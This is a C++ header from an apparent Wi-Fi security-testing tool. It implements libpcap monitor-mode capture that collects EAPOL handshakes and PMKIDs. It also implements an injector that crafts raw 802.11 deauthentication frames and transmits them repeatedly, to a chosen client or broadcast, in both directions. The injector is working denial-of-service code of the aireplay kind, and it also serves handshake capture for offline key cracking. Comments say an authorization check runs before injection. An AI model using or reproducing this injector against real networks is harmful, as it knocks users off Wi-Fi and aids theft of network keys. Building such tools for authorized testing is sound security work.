#pragma once

// Native libpcap realizations of the capture + injection HAL (preferred half of the
// hybrid backend). Compiled only when ZD_WITH_LIBPCAP is defined and <pcap.h> is present.
//
//   - NativeCaptureSource: opens the monitor interface with libpcap, decodes radiotap +
//     802.11 frames via dot11.hpp, and yields full frame-level events every poll
//     (beacons, deauth/disassoc, EAPOL handshakes, PMKIDs) that airodump CSV cannot show.
//   - NativeInjector: crafts 802.11 deauthentication frames and transmits them with
//     pcap_sendpacket. The authorization gate (SecSession) is enforced before this runs.

#ifdef ZD_WITH_LIBPCAP

#include <pcap/pcap.h>

#include <cstdint>
#include <cstring>
#include <string>
#include <vector>

#include "zd/secops_hal.hpp"
#include "dot11.hpp"
#include "../app/clock.hpp"

namespace zd {
namespace linux_backend {

class NativeCaptureSource final : public sec::ICaptureSource {
public:
    ~NativeCaptureSource() override { stop(); }

    bool start(const std::string& monitorIface) override {
        if (handle_ != nullptr) {
            return true;
        }
        char errbuf[PCAP_ERRBUF_SIZE] = {0};
        handle_ = pcap_create(monitorIface.c_str(), errbuf);
        if (handle_ == nullptr) {
            lastError_ = errbuf;
            return false;
        }
        int cfg = 0;
        cfg |= pcap_set_snaplen(handle_, 2048);
        cfg |= pcap_set_promisc(handle_, 1);
        cfg |= pcap_set_timeout(handle_, 50);
        cfg |= pcap_set_immediate_mode(handle_, 1);
        (void)cfg;  // best-effort tuning; activation below is the authoritative check
        if (pcap_activate(handle_) != 0) {
            lastError_ = pcap_geterr(handle_);
            pcap_close(handle_);
            handle_ = nullptr;
            return false;
        }
        const int dlt = pcap_datalink(handle_);
        if (dlt != DLT_IEEE802_11_RADIO && dlt != DLT_IEEE802_11) {
            lastError_ = "interface is not in monitor mode (unexpected DLT)";
            pcap_close(handle_);
            handle_ = nullptr;
            return false;
        }
        hasRadiotap_ = (dlt == DLT_IEEE802_11_RADIO);
        if (pcap_setnonblock(handle_, 1, errbuf) != 0) {
            lastError_ = errbuf;  // non-fatal: poll still works, just may block briefly
        }
        running_ = true;
        return true;
    }

    std::vector<sec::CapturedFrame> poll() override {
        pending_.clear();
        if (handle_ == nullptr) {
            return pending_;
        }
        // Drain up to a bounded number of frames per poll to keep the UI responsive.
        const int n = pcap_dispatch(handle_, 64, &NativeCaptureSource::trampoline,
                                    reinterpret_cast<u_char*>(this));
        (void)n;
        return pending_;
    }

    void stop() override {
        if (handle_ != nullptr) {
            pcap_close(handle_);
            handle_ = nullptr;
        }
        running_ = false;
    }

    bool running() const override { return running_; }
    const std::string& lastError() const { return lastError_; }

private:
    static void trampoline(u_char* user, const struct pcap_pkthdr* h, const u_char* bytes) {
        auto* self = reinterpret_cast<NativeCaptureSource*>(user);
        const uint32_t now = linux_app::nowMs();
        std::optional<sec::CapturedFrame> f;
        if (self->hasRadiotap_) {
            f = decodeRadiotapFrame(bytes, h->caplen, now);
        } else {
            f = decodeDot11(bytes, h->caplen, now, -100);
        }
        if (f.has_value()) {
            self->pending_.push_back(*f);
        }
    }

    pcap_t* handle_ = nullptr;
    bool hasRadiotap_ = true;
    bool running_ = false;
    std::vector<sec::CapturedFrame> pending_;
    std::string lastError_;
};

class NativeInjector final : public sec::IInjector {
public:
    explicit NativeInjector(sec::IMonitorControl* monitor) : monitor_(monitor) {}
    ~NativeInjector() override { closeHandle(); }

    bool available() const override {
        return monitor_ != nullptr && monitor_->isMonitor();
    }

    sec::InjectResult deauth(const std::string& bssid, const std::string& client,
                             uint32_t count) override {
        sec::InjectResult res;
        res.decision = sec::AuthDecision::Allowed;  // gate already cleared by SecSession
        if (!ensureHandle()) {
            res.transmitted = false;
            res.detail = "pcap open failed: " + lastError_;
            return res;
        }
        uint8_t ap[6], sta[6];
        if (!parseMac(bssid, ap)) {
            res.transmitted = false;
            res.detail = "bad BSSID";
            return res;
        }
        const bool broadcast = client.empty() || sec::isBroadcastMac(client);
        if (broadcast) {
            std::memset(sta, 0xFF, 6);
        } else if (!parseMac(client, sta)) {
            res.transmitted = false;
            res.detail = "bad client MAC";
            return res;
        }

        int sent = 0;
        for (uint32_t i = 0; i < count; ++i) {
            // AP -> client (or broadcast)
            if (sendDeauth(sta, ap, ap)) {
                ++sent;
            }
            // client -> AP (targeted only), as aireplay does, to hit both directions.
            if (!broadcast) {
                sendDeauth(ap, sta, ap);
            }
        }
        res.transmitted = sent > 0;
        res.detail = "pcap_sendpacket deauth x" + std::to_string(sent);
        return res;
    }

private:
    bool ensureHandle() {
        if (handle_ != nullptr) {
            return true;
        }
        if (monitor_ == nullptr || !monitor_->isMonitor()) {
            lastError_ = "no monitor interface";
            return false;
        }
        char errbuf[PCAP_ERRBUF_SIZE] = {0};
        handle_ = pcap_open_live(monitor_->monitorIface().c_str(), 800, 0, 100, errbuf);
        if (handle_ == nullptr) {
            lastError_ = errbuf;
            return false;
        }
        return true;
    }

    void closeHandle() {
        if (handle_ != nullptr) {
            pcap_close(handle_);
            handle_ = nullptr;
        }
    }

    static bool parseMac(const std::string& s, uint8_t out[6]) {
        const std::string n = sec::normalizeMac(s);
        if (!sec::isValidMac(n)) {
            return false;
        }
        unsigned v[6];
        if (std::sscanf(n.c_str(), "%2x:%2x:%2x:%2x:%2x:%2x", &v[0], &v[1], &v[2], &v[3], &v[4],
                        &v[5]) != 6) {
            return false;
        }
        for (int i = 0; i < 6; ++i) {
            out[i] = static_cast<uint8_t>(v[i] & 0xFF);
        }
        return true;
    }

    // Build + send one 802.11 deauth (reason 7: class-3 frame from nonassociated STA).
    bool sendDeauth(const uint8_t* dst, const uint8_t* src, const uint8_t* bssid) {
        uint8_t frame[8 + 24 + 2];
        std::size_t n = 0;
        // Minimal radiotap header (version 0, length 8, no fields).
        const uint8_t rt[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};
        std::memcpy(frame, rt, sizeof(rt));
        n += sizeof(rt);
        // 802.11 deauth MAC header.
        frame[n++] = 0xC0;  // frame control: type=mgmt, subtype=deauth
        frame[n++] = 0x00;
        frame[n++] = 0x00;  // duration
        frame[n++] = 0x00;
        std::memcpy(frame + n, dst, 6);   n += 6;
        std::memcpy(frame + n, src, 6);   n += 6;
        std::memcpy(frame + n, bssid, 6); n += 6;
        frame[n++] = 0x00;  // sequence control
        frame[n++] = 0x00;
        frame[n++] = 0x07;  // reason code (7)
        frame[n++] = 0x00;
        return pcap_sendpacket(handle_, frame, static_cast<int>(n)) == 0;
    }

    sec::IMonitorControl* monitor_;
    pcap_t* handle_ = nullptr;
    std::string lastError_;
};

}  // namespace linux_backend
}  // namespace zd

#endif  // ZD_WITH_LIBPCAP
